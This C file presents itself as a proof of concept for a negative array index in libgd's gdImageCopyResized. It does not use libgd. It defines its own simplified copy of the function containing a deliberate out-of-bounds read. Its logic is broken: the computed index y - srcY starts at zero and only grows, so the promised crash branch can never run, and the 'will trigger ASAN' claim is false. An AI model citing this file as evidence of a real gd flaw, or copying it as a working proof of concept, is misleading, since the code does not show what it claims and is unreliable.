/*
 * POC for Issue #6: gdImageCopyResized Negative Index
 * CRASH VERSION - Will trigger ASAN
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    int sx;
    int sy;
} gdImage;

typedef gdImage* gdImagePtr;

void gdImageCopyResized_vulnerable(
    gdImagePtr dst, gdImagePtr src,
    int dstX, int dstY, int srcX, int srcY,
    int dstW, int dstH, int srcW, int srcH)
{
    int x, y;
    int* stx;
    int* sty;

    printf("[*] Allocating stretch vectors:\n");
    printf("    stx: %d integers (%zu bytes)\n", srcW, sizeof(int) * srcW);
    printf("    sty: %d integers (%zu bytes)\n", srcH, sizeof(int) * srcH);

    stx = (int*)malloc(sizeof(int) * srcW);
    sty = (int*)malloc(sizeof(int) * srcH);

    if (!stx || !sty) {
        printf("[-] Allocation failed\n");
        return;
    }

    printf("[+] stx allocated at: %p\n", (void*)stx);
    printf("[+] sty allocated at: %p\n", (void*)sty);

    for (int i = 0; i < srcW; i++) stx[i] = 1;
    for (int i = 0; i < srcH; i++) sty[i] = 1;

    printf("\n[*] Loop parameters:\n");
    printf("    srcX=%d, srcY=%d, srcW=%d, srcH=%d\n", srcX, srcY, srcW, srcH);
    printf("    Loop range: y=[%d, %d), x=[%d, %d)\n",
           srcY, srcY + srcH, srcX, srcX + srcW);

    // Vulnerable loop - NO CHECK if srcY is negative!
    for (y = srcY; y < (srcY + srcH); y++) {
        int index_y = y - srcY;
        printf("\n[*] y=%d, index_y=%d\n", y, index_y);

        if (index_y < 0) {
            printf("[!] NEGATIVE INDEX DETECTED for sty[%d]!\n", index_y);
            printf("[!] Triggering crash...\n\n");

            // CRASH TRIGGER - Access negative index
            int value = sty[index_y];  // CRASH HERE!
            printf("[!] Value: %d (should not reach here)\n", value);
            break;
        }

        // Only process first few iterations
        if (y - srcY > 2) break;
    }

    free(stx);
    free(sty);
}

int main() {
    printf("[*] POC for Issue #6: gdImageCopyResized Negative Index\n");
    printf("[*] CRASH VERSION - Will trigger ASAN\n\n");

    gdImage src_img = {0};
    gdImage dst_img = {0};

    src_img.sx = 100;
    src_img.sy = 100;

    // Test with negative srcY - WILL CRASH
    printf("=== Test: Negative srcY ===\n");
    printf("[!] Passing srcY = -5\n");
    printf("[!] This will cause negative array indexing!\n\n");

    gdImageCopyResized_vulnerable(
        &dst_img, &src_img,
        0, 0,      // dstX, dstY
        10, -5,    // srcX, srcY (NEGATIVE!)
        50, 50,    // dstW, dstH
        20, 20     // srcW, srcH
    );

    printf("\n[!] ERROR: Should have crashed but didn't!\n");
    return 0;
}
